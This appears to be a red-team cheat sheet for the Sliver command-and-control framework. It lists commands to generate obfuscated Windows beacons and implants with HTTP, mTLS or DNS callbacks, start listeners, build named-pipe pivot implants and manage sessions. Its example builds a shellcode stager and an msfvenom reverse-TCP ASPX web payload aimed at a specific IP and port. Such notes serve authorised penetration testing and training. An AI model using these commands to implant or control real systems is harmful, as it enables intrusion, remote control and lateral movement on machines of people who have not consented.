# Sliver payload generation

[Generic Beacon / Implant generation](sliver-payload-generation.md#generic-beacon-implant-generation-1)

[Named Pipe Payload Generation](sliver-payload-generation.md#named-pipe-payload-generation)

[Example](sliver-payload-generation.md#example)

#### Generic Beacon / Implant generation

To generate payloads do this. Keep in mind you can substitute http for mtls, wireguard (wg), and dns. Keep in mind just removing the `beacon`tag will make this into an implant

```bash
generate beacon --http <lhost> -N http_beacon --os windows
```

Some helpful flags to consider when generating beacons are:

```bash
--http            # Uses http callbacks
--mtls            # Uses mTLS callbacks
--dns             # Uses DNS callbacks 
-e                # Enables ofbuscation tactics
--os              # Specify the operating system
-J 5              # Sets a jitter time of 5 seconds
-S 5              # Sets callback time to 5 seconds
--format          # exe, shared (dll), service, shellcode
```

to start your listener just type&#x20;

```bash
http
OR
http --lport 8088
```

#### Named Pipe Payload Generation&#x20;

Start your named-pipe listener on a interactive session

```bash
pivots named-pipe --bind hack
```

After that you can generate a pivot implant using this command

```bash
generate --named-pipe <ip>/pipe/hack -N hack_pipe
```

#### Session Management

```bash
sessions         # Lists active / inactive sessions
sesskions -K     # Removes all sessions available or not
sessions prune   # Removes unavailable sessions
sessions -k -i <session> # Removes specific session
beacons          # lists active/inactive beacons
interactive      # turns a beacon into an interactive session
```

#### Example

```bash
profiles new --http <ip>:8088 --format shellcode hack
stage-listener --url tcp://<ip>:4443 --profile hack
http -L <ip> -l 8088
generate stager --lhost <ip> --lport 4443 --format csharp --save staged.txt
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx
# Replace the msf shellcode with the sliver shellcode and you have a good aspx agent
```

